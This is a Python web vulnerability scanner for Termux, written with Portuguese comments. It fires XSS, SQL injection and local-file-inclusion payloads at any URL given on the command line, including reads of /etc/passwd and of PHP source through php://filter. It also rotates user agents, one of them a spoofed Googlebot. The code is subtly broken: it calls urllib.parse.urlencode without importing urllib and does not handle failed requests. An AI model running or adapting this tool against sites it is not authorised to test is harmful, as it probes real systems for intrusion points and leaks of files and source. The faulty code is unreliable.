#!/data/data/com.termux/files/usr/bin/python3
import re
import time
import sys
import requests
from urllib.parse import urlparse, quote
import random

class UltimateScanner:
    def __init__(self):
        self.payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '" onfocus=alert(1) autofocus="'
            ],
            'sqli': [
                "' OR '1'='1",
                "' UNION SELECT null,version(),null-- -",
                "' OR SLEEP(5)--"
            ],
            'lfi': [  # Adicionei os payloads LFI que estavam faltando
                '../../../../etc/passwd',
                'php://filter/convert.base64-encode/resource=index.php'
            ]
        }
        self.session = requests.Session()
        self.timeout = 15
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
            "Termux-Scanner/1.0",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
        ]

    def scan(self, url):
        """Executa todos os testes de vulnerabilidade"""
        print(f"\n[+] Iniciando scan ULTIMATE em: {url}")
        
        if not self._check_url(url):
            print("[-] URL inválida. Use http:// ou https://")
            return
        
        results = []
        results.extend(self.test_xss(url))
        results.extend(self.test_sqli(url))
        results.extend(self.test_lfi(url))  # Agora este método existe
        results.extend(self.check_headers(url))
        
        return results

    def _check_url(self, url):
        """Verifica se a URL é válida"""
        try:
            return all([url.startswith(('http://', 'https://')), '.' in url])
        except:
            return False

    def test_xss(self, url):
        """Teste de XSS avançado"""
        print("[++] Testando XSS Avançado...")
        vulns = []
        
        for payload in self.payloads['xss']:
            try:
                # Testa em parâmetros GET
                parsed = urlparse(url)
                if parsed.query:
                    params = {}
                    for param in parsed.query.split('&'):
                        if '=' in param:
                            key, value = param.split('=', 1)
                            params[key] = payload
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
                    response = self._send_request(test_url)
                    
                    if payload in response.text:
                        vulns.append({
                            'type': 'XSS',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
                
            except Exception as e:
                continue
                
        return vulns

    def test_sqli(self, url):
        """Teste de SQL Injection"""
        print("[++] Testando SQLi Avançado...")
        vulns = []
        
        for payload in self.payloads['sqli']:
            try:
                start_time = time.time()
                test_url = f"{url}{quote(payload)}"
                response = self._send_request(test_url)
                
                # Time-Based Detection
                if time.time() - start_time > 2:
                    vulns.append({
                        'type': 'SQLi (Time-Based)',
                        'url': url,
                        'payload': payload,
                        'severity': 'Critical'
                    })
                
                # Error-Based Detection
                elif any(word in response.text.lower() for word in ['error', 'sql', 'syntax']):
                    vulns.append({
                        'type': 'SQLi (Error-Based)',
                        'url': url,
                        'payload': payload,
                        'severity': 'High'
                    })
                    
            except Exception as e:
                continue
                
        return vulns

    def test_lfi(self, url):
        """Teste de Local File Inclusion (novo método)"""
        print("[++] Testando LFI...")
        vulns = []
        
        for payload in self.payloads['lfi']:
            try:
                test_url = f"{url}{payload}"
                response = self._send_request(test_url)
                
                # Detecção básica de LFI
                if any(indicator in response.text for indicator in ['root:', '<?php', 'bin/bash']):
                    vulns.append({
                        'type': 'LFI',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'High'
                    })
                    
            except Exception as e:
                continue
                
        return vulns

    def check_headers(self, url):
        """Verifica cabeçalhos de segurança"""
        print("[++] Verificando Headers de Segurança...")
        vulns = []
        
        try:
            response = self._send_request(url)
            security_headers = {
                'CSP': 'Content-Security-Policy',
                'HSTS': 'Strict-Transport-Security',
                'XSS': 'X-XSS-Protection'
            }
            
            for name, header in security_headers.items():
                if header not in response.headers:
                    vulns.append({
                        'type': 'Header Ausente',
                        'url': url,
                        'payload': header,
                        'severity': 'Medium'
                    })
                    
        except Exception as e:
            print(f"[-] Erro ao verificar headers: {str(e)}")
            
        return vulns

    def _send_request(self, url, headers=None):
        """Envia requisição HTTP"""
        if headers is None:
            headers = {'User-Agent': random.choice(self.user_agents)}
        
        try:
            return self.session.get(url, headers=headers, timeout=self.timeout)
        except requests.exceptions.RequestException as e:
            print(f"[-] Erro ao acessar {url}: {str(e)}")
            return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python ruskscan_ultimate.py http://alvo.com")
        sys.exit()
    
    scanner = UltimateScanner()
    results = scanner.scan(sys.argv[1])
    
    if results:
        print("\n[+] Resultados do Scan:")
        for vuln in results:
            print(f"[!] {vuln['severity']} - {vuln['type']}")
            print(f"    URL: {vuln['url']}")
            print(f"    Payload: {vuln['payload']}\n")
    else:
        print("\n[-] Nenhuma vulnerabilidade encontrada.")
